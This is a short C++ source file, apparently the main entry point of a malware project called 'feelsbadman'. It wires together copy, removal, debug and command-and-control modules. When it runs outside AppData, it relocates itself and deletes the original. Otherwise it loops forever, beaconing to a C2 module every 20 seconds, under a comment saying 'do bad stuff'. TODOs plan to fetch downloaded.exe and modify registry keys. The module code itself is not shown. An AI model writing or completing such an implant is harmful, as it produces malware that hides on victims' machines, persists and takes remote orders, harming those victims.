// feelsbadman.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include "C2.h"
#include "CP.h"
#include "RM.h"
#include "DB.h"
#include "UTIL.h";
#include <iostream>


int main()
{
	// instantiate modules
	CP copyModule;
	C2 connModule;
	RM remvModule;
	DB debgModule;
	UTIL util;
	
	if (!util.isExecutingFromAppData()) {
		copyModule.execute();
		debgModule.execute();
		remvModule.execute();
		return 0;
	}

	//TODO check if downloaded.exe exists before retrieving
	//TODO modify registry keys
	while (true) {
		// do bad stuff
		debgModule.execute();
		connModule.execute();
		Sleep(20000);
	}
}

